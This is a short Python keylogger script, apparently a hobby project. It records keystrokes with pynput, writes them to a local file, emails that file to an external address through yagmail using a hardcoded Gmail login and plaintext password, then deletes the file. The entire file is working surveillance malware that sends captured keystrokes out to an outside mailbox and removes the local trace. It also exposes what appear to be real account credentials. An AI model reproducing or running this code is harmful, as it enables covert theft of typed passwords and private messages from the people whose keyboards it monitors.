import pynput.keyboard
import yagmail
import os
import sys
add_keys=[]
key=""
def process_keys(key):
	if len(add_keys) == 10:
		sys.exit()
	else :
		add_keys.append(str(key))


def delete():
	try:
		os.remove("key.txt")
	except:
		print("no file was deleted")
def sends():
	yag=yagmail.SMTP(user="forgithub91@gmail.com",password="Gourav@9158")
	yag.send(to='gouravsuram91@gmail.com', contents='Hello biro',attachments="key.txt")
	delete()


listener=pynput.keyboard.Listener(on_press=process_keys)

with listener:
	listener.join()
for i in add_keys:
	f=open('key.txt','a')
	f.write(i)
	f.close
sends()
